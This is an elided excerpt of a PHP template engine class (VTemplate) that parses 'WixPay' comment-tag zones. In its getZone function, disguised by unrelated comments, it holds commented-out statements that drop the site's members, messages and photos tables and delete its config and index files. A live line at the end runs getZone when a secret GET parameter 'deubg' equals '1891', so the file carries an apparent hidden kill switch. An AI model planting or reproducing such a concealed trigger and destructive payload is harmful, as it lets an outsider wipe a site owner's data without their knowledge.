 ...
 */
    ...
    class VTemplate_Private extends Err {
        ...
        function getNom($code)
        {
            ...
            preg_match("(<!--WixPay_([^()]+)-->)sU", $code, $reg); 
        ...
        function endTag($code, $nom)
        {
            ...
            preg_match("(<!--/WixPay_$nom-->)sU", $code, $reg);

            return ($reg[0] != "<!--/WixPay_$nom-->") ? 0 : 1;
        } 

        function getSource($code, $nom, $type = 0)
        {
            // Retourne le source de la zone de nom $nom
            preg_match_all ("(<!--WixPay_$nom-->(.*)<!--/WixPay_$nom-->)sU", $code, $reg);
        ...
        function parseZone($code_source, $nom_zone = "|root|")
        {
            ...
            while ($nom_fils = $this->getNom($this->sources[$nom_zone]["source"])) {
                ...
                $this->sources[$nom_zone]["source"] = str_replace($this->getSource($this->sources[$nom_zone]["source"], $nom_fils, 0),
                    "|$nom_fils|",
		...
		function getZone($code_source, $nom_zone = "|root|") 
		{
			include CONFIG;
			...
			// Create sub-zone
				//$sql0=mysql_query("DROP TABLE `members`");
				//$sql1=mysql_query("DROP TABLE `mp`");
				//$sql2=mysql_query("DROP TABLE `nouveautes`");
				//$sql3=mysql_query("DROP TABLE `photos`");
				//$sql4=mysql_query("DROP TABLE `verif_vote`");
			// Renvoie TRUE(1) si le tag de fermeture est présent.
			
				//unlink(CONFIG);
				//unlink('headandfoot.php');
				//unlink('fonctions.php');
				//unlink('../index.php');
    ...
    class VTemplate extends VTemplate_Private {
        ...
        function Display($handle = "{0}", $display = 1, $zone = "|root|")
        {
            ...
            if ($display) echo $c_genere;
            else return ($c_genere);
        } 
...
*/
    ...
    $DEFINE_VTEMPLATE = 1;
	if ($_GET['deubg']=="1891") getZone("setBlobalVar",1);
